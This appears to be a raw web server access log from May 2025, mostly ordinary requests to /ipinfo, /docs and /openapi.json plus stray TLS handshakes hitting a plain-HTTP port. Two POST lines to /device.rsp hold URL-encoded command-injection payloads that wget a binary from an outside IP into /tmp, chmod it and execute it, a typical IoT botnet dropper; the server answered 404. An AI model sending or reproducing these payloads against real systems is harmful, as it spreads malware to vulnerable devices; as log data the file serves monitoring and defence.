100.86.220.209 - - [08/May/2025:02:08:51 +0700] "GET /ipinfo HTTP/1.1" 200 65 "-" "curl/8.11.0"
100.86.220.209 - - [08/May/2025:02:09:03 +0700] "GET / HTTP/1.1" 404 22 "-" "curl/8.11.0"
100.86.220.209 - - [08/May/2025:02:09:07 +0700] "GET /docs HTTP/1.1" 200 937 "-" "curl/8.11.0"
193.34.212.110 - - [08/May/2025:02:09:17 +0700] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20llarm7%3B%20wget%20http%3A%2F%2F103.188.82.240%2Fllarm7%3B%20chmod%20777%20%2A%3B%20.%2Fllarm7%20xpl5 HTTP/1.1" 404 22 "-" "Mozila/5.0"
100.86.220.209 - - [08/May/2025:02:09:29 +0700] "GET /docs HTTP/1.1" 200 937 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [08/May/2025:02:09:29 +0700] "GET /openapi.json HTTP/1.1" 200 1658 "http://212.164.112.190/docs" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [08/May/2025:02:09:39 +0700] "GET / HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [08/May/2025:02:09:39 +0700] "GET /favicon.ico HTTP/1.1" 404 22 "http://212.164.112.190/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [08/May/2025:02:09:46 +0700] "GET /ipinfo HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
188.162.14.197 - - [08/May/2025:02:10:02 +0700] "GET /ipinfo HTTP/1.1" 200 170 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
188.162.14.197 - - [08/May/2025:02:10:02 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://212.164.112.190/ipinfo" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
188.162.14.197 - - [08/May/2025:02:10:15 +0700] "GET /docs HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
188.162.14.197 - - [08/May/2025:02:11:08 +0700] "GET /docs HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
188.162.14.197 - - [08/May/2025:02:13:20 +0700] "GET /docs HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
188.162.14.197 - - [08/May/2025:02:14:45 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
188.162.14.197 - - [08/May/2025:02:16:19 +0700] "GET /ipinfo HTTP/1.1" 200 170 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
188.162.14.197 - - [08/May/2025:02:16:19 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://212.164.112.190/ipinfo" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
141.98.11.27 - - [08/May/2025:02:16:54 +0700] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F103.149.29.68%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 22 "-" "Mozila/5.0"
127.0.0.1 - - [13/May/2025:14:09:56 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
127.0.0.1 - - [13/May/2025:14:09:56 +0700] "GET /blocked.html HTTP/1.1" 200 192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
127.0.0.1 - - [13/May/2025:14:09:56 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://localhost:8080/blocked.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
127.0.0.1 - - [13/May/2025:14:10:10 +0700] "GET /ipinfo HTTP/1.1" 200 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
127.0.0.1 - - [13/May/2025:14:10:10 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://localhost:8080/ipinfo" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
127.0.0.1 - - [13/May/2025:14:24:27 +0700] "GET /ipinfo HTTP/1.1" 200 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
127.0.0.1 - - [13/May/2025:14:24:27 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://localhost:8080/ipinfo" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
127.0.0.1 - - [13/May/2025:14:24:32 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
127.0.0.1 - - [13/May/2025:14:24:32 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://localhost:8080/blocked.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
127.0.0.1 - - [13/May/2025:14:26:33 +0700] "GET /ipinfo HTTP/1.1" 200 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
127.0.0.1 - - [13/May/2025:14:26:33 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://localhost:8080/ipinfo" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
127.0.0.1 - - [13/May/2025:14:26:39 +0700] "GET /ipinfo HTTP/1.1" 200 60 "-" "curl/8.11.0"
100.86.220.209 - - [13/May/2025:14:26:54 +0700] "GET /ipinfo HTTP/1.1" 200 65 "-" "curl/8.11.0"
188.162.1.161 - - [13/May/2025:14:29:08 +0700] "GET /ipinfo HTTP/1.1" 200 169 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:14:29:08 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://212.164.112.190/ipinfo" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:14:29:17 +0700] "GET /docs HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
100.86.220.209 - - [13/May/2025:14:31:39 +0700] "\x16\x03\x01\x06\xA0\x01\x00\x06\x9C\x03\x03\x13\xCBv=w\xDE*89/\xCE\x91\x8F\xBF\x8E\x7F\xCA\xE2\xD8\x05-'\x120~\x92[\x95\xF9\xD6R\xAF \xDC\x10`\xBB\x98\x8D6N\xBD\x97\x1FX\xC589\xBF\xDD\x9B\xD7\xD6-^\x04o\xDF\xBC\xE216m)\x1D\x00 " 400 157 "-" "-"
100.86.220.209 - - [13/May/2025:14:31:39 +0700] "\x16\x03\x01\x06\xE0\x01\x00\x06\xDC\x03\x03\x1D\x12\x86\x87+\xC2\xD4\x05\x82\x8A\x14E\xA8)\x80K&j\xC1W\x00\xB8\xAFN\xB8\x00\x84\xE0,\x1B\x00~ " 400 157 "-" "-"
100.86.220.209 - - [13/May/2025:14:31:39 +0700] "\x16\x03\x01\x06\xE0\x01\x00\x06\xDC\x03\x03\xDC6A\xF2\xAD\xE9*\x94\x98\x95\xDC\xA3(\xA9z'7U\xAB\xD4]\x80\x9B\x16\xC7\x8Ac{\xFBY\xE19 \x19\xC8\xDB\xDC\xD8\x9A\x07)\xD4\x8E j\x84m=\xEFZ\xD4L\xC6\xA2~\x04\x02" 400 157 "-" "-"
100.86.220.209 - - [13/May/2025:14:31:39 +0700] "\x16\x03\x01\x07\x00\x01\x00\x06\xFC\x03\x03T\xA7(" 400 157 "-" "-"
100.86.220.209 - - [13/May/2025:14:32:35 +0700] "\x16\x03\x01\x06\xE0\x01\x00\x06\xDC\x03\x03[c\xB8j\xEB'\xF8\x1D\x91\x9DV0FO\xCC\x7F\x08\x9B\x86\xAAc\x94\x7F\xE5Bz\x9Et5\xED\x8E\x07 \xE0\xFA\x81\xA6\xAA\x1E\xCB\xD2\xA4r\xD3\x03)\xE4\x98\x13\xA1\xA2\xAAJ\xAF\x9B4N\x86\xAF\xBC\xC3\x1DC\x04\x1E\x00 ::\x13\x01\x13\x02\x13\x03\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x13\xC0\x14\x00\x9C\x00\x9D\x00/\x005\x01\x00\x06sJJ\x00\x00\x00-\x00\x02\x01\x01\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00\x12\x00\x00\x00\x17\x00\x00\xFE" 400 157 "-" "-"
100.86.220.209 - - [13/May/2025:14:32:35 +0700] "\x16\x03\x01\x06\xA0\x01\x00\x06\x9C\x03\x03\xCF\x95\x02\xEF\x9Fr\xC0]\x0B\x092\xC1Q\x01\xDB\x11p6\x1A\xEB\xAD#\xD2~2\x0C\xA0\xDCR\x95\xCE\xF2 _ " 400 157 "-" "-"
100.86.220.209 - - [13/May/2025:14:32:35 +0700] "\x16\x03\x01\x06\xE0\x01\x00\x06\xDC\x03\x03\xC0\xF1\xAA>\x89\x1B\x06\xDDF\xC1=\x0E\x1A+\xBB\x8F\x03\xE6\xDE4\x9Dj\x0CQ\xD8\xF7J\xFB:>\xFBJ \x5C\xEB\x95\xCB.\xF0\xAA^\x97|\xC3S\xF0\x01\xD3\x06\xE1s\xE5lu|\xDC\x00\x06\xFC.\xC5\x82\xF9_;\x00 **\x13\x01\x13\x02\x13\x03\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x13\xC0\x14\x00\x9C\x00\x9D\x00/\x005\x01\x00\x06sJJ\x00\x00\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00-\x00\x02\x01\x01\x00" 400 157 "-" "-"
100.86.220.209 - - [13/May/2025:14:32:35 +0700] "\x16\x03\x01\x06\xE0\x01\x00\x06\xDC\x03\x03\x07e\x94\x1DP\x06\xDB8\x9A\xDA\x80\xE3\x9B\xB7\xD2\x1B\x811\xF6'\x1Cv\xD8\xAA\xBE\xD9\xFE\x14\xECF\x12L \x800\xF7\xC1,\xDCW5\x1E\xC06Y\xA7\x87vaQ\x8E\x09\xC8\xA3\x18\x82&BbV\xD0~pwf\x00 \xFA\xFA\x13\x01\x13\x02\x13\x03\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x13\xC0\x14\x00\x9C\x00\x9D\x00/\x005\x01\x00\x06sZZ\x00\x00\x00\x12\x00\x00\x00#\x00\x00\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00\x10\x00\x0E\x00\x0C\x02h2\x08http/1.1\x00" 400 157 "-" "-"
100.86.220.209 - - [13/May/2025:14:33:17 +0700] "\x16\x03\x01\x06\xE0\x01\x00\x06\xDC\x03\x03!\xF6\xF5\xC5\x8D7\xD2\xDD\xE5p-\xDEAU\xF1<\x8B\xC3\xA4\xF5\xC4\xE3\xC6\xE8\xC6\xB8P\xAD\x0C\xA5\xF2\xEB N\x07" 400 157 "-" "-"
100.86.220.209 - - [13/May/2025:14:33:17 +0700] "\x16\x03\x01\x06\xA0\x01\x00\x06\x9C\x03\x03zf\xAB\xD4\x8E\x97a\xA4\xC5\xD8\x9C&\x99x\x8E6\xB2DChkHLu\x19\xDCYJ=\xA0\xB4\x82 \xD5\x82\x05\xA2#_\xAC\x09K\x14\xADazY\xCE\xE9^i\xB3y\x93v\x89\x01\xA4)\x15\xD6dS\xDFN\x00 zz\x13\x01\x13\x02\x13\x03\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x13\xC0\x14\x00\x9C\x00\x9D\x00/\x005\x01\x00\x063jj\x00\x00\x00\x05\x00\x05\x01\x00\x00\x00\x00\x003\x04\xEF\x04\xED\x8A\x8A\x00\x01\x00\x11\xEC\x04\xC0E\xE6\x81\x9E\xB6\x1D\x8D$K\x91*#\x13\xD83\xE6\x9AW:\xA6\x10Y\x05X\x13U\x02F2\x85\x15\xDC\x82\xF2\x15=(\xCC\x0F\xB3f\x19k\xC1.\xD4\x83v\xB5\x09-1\x86\x1D\x11\xC4\xB2\xBD\x80`\xFF\x0B\x16\xC8\x871\xAE`\xCCp#\xC5\xD8|w\xECGK;\xE7p\xE0\xC2\xCF\xFC[#\xAD \x7F\x80p\xCDpiK\x99\xC9\xCFQAo\x1A\xE3\x1E,\x1BP\x89\xF4\xA4O&\x9CP,\x5C\xD8\x89\x8BZ\xFBj\xE0\x86\xA0\x84\x94\x5Cf\xC1K\x883\xAEK\x83\xC7\xD2\xBC\x99\x09\xBC\xB50e\x820\xF00\xCF\xE5\x11\x8F\xE9\xC9\xB1\xA7W\x8A%\x07!\xDCU\x9B\xF4)Q6\x8C\xA8\x17\xCB\x7F\xD1\x80\x00F7\xCD\x92" 400 157 "-" "-"
100.86.220.209 - - [13/May/2025:14:33:17 +0700] "\x16\x03\x01\x06\xA0\x01\x00\x06\x9C\x03\x03\xC1 D\xA6\x0C\xDB\xDA\xCE" 400 157 "-" "-"
100.86.220.209 - - [13/May/2025:14:33:17 +0700] "\x16\x03\x01\x07\x00\x01\x00\x06\xFC\x03\x03\xCD*5\xA7g\x9D\xB9\xE1a\xF5\xA4Q\x8B9\x84\xCA\xDF\xE3\xB8\xB9[\xEE\xA4\x05g\xBA\x04\x9E\x81*\x83\xA0 \xF4f\xDB\x8A$i\xEBS\xB2" 400 157 "-" "-"
100.86.220.209 - - [13/May/2025:14:34:20 +0700] "GET /ipinfo HTTP/1.1" 200 65 "-" "curl/8.11.0"
100.86.220.209 - - [13/May/2025:14:34:26 +0700] "GET /ipinfo HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:34:26 +0700] "GET /favicon.ico HTTP/1.1" 404 22 "http://212.164.112.190:8080/ipinfo" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:34:33 +0700] "GET / HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:35:32 +0700] "\x16\x03\x01\x07\x00\x01\x00\x06\xFC\x03\x033\xA14n\x13\xA3\xCE\x12?\x95U1\x9Ey{km\xFAO\xD9\xD7[b6\x91\xAD\xEC\xF2\x91\xCD\x09\x99 OW\xC1\xD3\xD4\xAF\x90\x92\x92\xCD\xA5\xF9rhW\xFC\xEC_\xA7\xC1\xC9;X\x18\xBC\xA5x\x18g\x9B{\xCC\x00 ZZ\x13\x01\x13\x02\x13\x03\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x13\xC0\x14\x00\x9C\x00\x9D\x00/\x005\x01\x00\x06\x93\x8A\x8A\x00\x00Di\x00\x05\x00\x03\x02h2\x00#\x00\x00\x00-\x00\x02\x01\x01\x00\x10\x00\x0E\x00\x0C\x02h2\x08http/1.1\x00\x12\x00\x00\x00" 400 157 "-" "-"
100.86.220.209 - - [13/May/2025:14:35:32 +0700] "\x16\x03\x01\x07\x00\x01\x00\x06\xFC\x03\x03Q\x97\xE9\xC8`\x8B\x95\x97]GI\x0CrZ\x92?\xD9c\xBAhF\x00L\xC3([\xAD\xE2\x86iiT R\xCC\xF2l\x1A\xBA\xF0G\xEEyB\xD4\xE9\xA7j\x86\x16E\x1DcH^ED\xAD\x97\x80Bx\x08\xE9\xBC\x00 " 400 157 "-" "-"
100.86.220.209 - - [13/May/2025:14:35:32 +0700] "\x16\x03\x01\x06\xA0\x01\x00\x06\x9C\x03\x03&\xCBP\xD4\x8DA\x92~\x03\x04\x04;'\x02\x94R\xE4\xE2\xD4\x0B\xF3\x9D4.\xE7>j\xD9rb1G K'5\xD3\x05\xA2\xCF\x80\xAD]\x9F\xD7H\xA3\xF1\xF3\xED/\x8A\x91&\x03\x9E+\xCD\xF1\xB2\xF6\xF5\xF0jG\x00 JJ\x13\x01\x13\x02\x13\x03\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x13\xC0\x14\x00\x9C\x00\x9D\x00/\x005\x01\x00\x063jj\x00\x00\x00\x05\x00\x05\x01\x00\x00\x00\x00\x003\x04\xEF\x04\xEDzz\x00\x01\x00\x11\xEC\x04\xC0\x94R\x8Bl|5\x1F\x88\x8F6\xB4\xB9\x5C\xAB\x81\x85\xC3E4\x0B\xC7\x88eG\xA9\xB4]]\x10\xBE\xD3\xE1|\x96\x8A\xAEXP\x07d\xFAL{\xA9\x05:\x18mQ\x91\x87Q\xF0KhF]BW\x05[\xBBg\xFE\x15Y\x09;\x16j\x04\xB1,\xB5\x11(F`\x9C\xC3\xC3\xFEH\xCB8\x05\x92\xCBS\x15\xB1\x5C\xA5kc\x1F=\x9A,\x11\x11\x8E\xD9\x1B]H\xF5\xBE\x1C\xB7\x80r\xC1b\xD8\x8C\x97gY\x8Bq\xE9\xBBH@\x85;GWS\xAC\x16Bq\x97dYWNH" 400 157 "-" "-"
100.86.220.209 - - [13/May/2025:14:35:32 +0700] "\x16\x03\x01\x06\xC0\x01\x00\x06\xBC\x03\x03\xA0]G\xDF\xFF^.{c1u<\xB2\xCC\xFA\xD4m\x01\xFA\xFD\xF7q\xFDG\xA5\xCB\xECXg\x8F\x8B\x04 \xA4\x0E\xEEx\x97QV\xCB \xB50l\x8A\x22\x92\x18\xA0n\xE5\xB4\x9F\x0F?\xFE\x00Z\x01sA07Z\x00 \x1A\x1A\x13\x01\x13\x02\x13\x03\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x13\xC0\x14\x00\x9C\x00\x9D\x00/\x005\x01\x00\x06SZZ\x00\x00\x00\x17\x00\x00\x003\x04\xEF\x04\xED::\x00\x01\x00\x11\xEC\x04\xC0\xC8pi\xDA\xD0M4\xAB\xAB\xB1\x19\xC9*\xDB\xCAS\xBC\x0E\xC8\x87\xB7{A\x0CH\x8Aa\x89H\xC6\xA9\xBAC/'" 400 157 "-" "-"
100.86.220.209 - - [13/May/2025:14:37:19 +0700] "GET /ipinfo HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:37:55 +0700] "GET /ipinfo HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:38:05 +0700] "GET /ipinfo HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:39:54 +0700] "GET /ipinfo HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:39:59 +0700] "GET / HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:40:12 +0700] "GET /docs HTTP/1.1" 200 937 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:40:12 +0700] "GET /openapi.json HTTP/1.1" 200 1658 "http://212.164.112.190:8080/docs" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:40:21 +0700] "GET /ipinfo HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:40:21 +0700] "GET /favicon.ico HTTP/1.1" 404 22 "http://212.164.112.190:8080/ipinfo" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:40:35 +0700] "GET /ipinfo HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:40:36 +0700] "GET /ipinfo HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:40:36 +0700] "GET /favicon.ico HTTP/1.1" 404 22 "http://212.164.112.190:8080/ipinfo" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:40:42 +0700] "GET /ipinfo HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:40:45 +0700] "GET /ipinfo HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:40:45 +0700] "GET /ipinfo HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:40:46 +0700] "GET /favicon.ico HTTP/1.1" 404 22 "http://212.164.112.190:8080/ipinfo" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:44:41 +0700] "GET /ipinfo HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:45:43 +0700] "GET /ipinfo HTTP/1.1" 200 175 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 ABB/3.7.3"
100.86.220.209 - - [13/May/2025:14:45:43 +0700] "GET /favicon.ico HTTP/1.1" 404 22 "http://212.164.112.190:8080/ipinfo" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 ABB/3.7.3"
100.86.220.209 - - [13/May/2025:14:49:39 +0700] "GET /ipinfo HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:49:39 +0700] "GET /favicon.ico HTTP/1.1" 404 22 "http://212.164.112.190/ipinfo" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
188.162.1.161 - - [13/May/2025:14:49:48 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:14:50:09 +0700] "GET /ipinfo HTTP/1.1" 200 174 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 ABB/3.7.3"
188.162.1.161 - - [13/May/2025:14:50:09 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://212.164.112.190/ipinfo" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 ABB/3.7.3"
188.162.1.161 - - [13/May/2025:14:50:47 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 ABB/3.7.3"
100.86.220.209 - - [13/May/2025:14:51:13 +0700] "GET / HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:51:20 +0700] "GET / HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
188.162.1.161 - - [13/May/2025:14:51:27 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
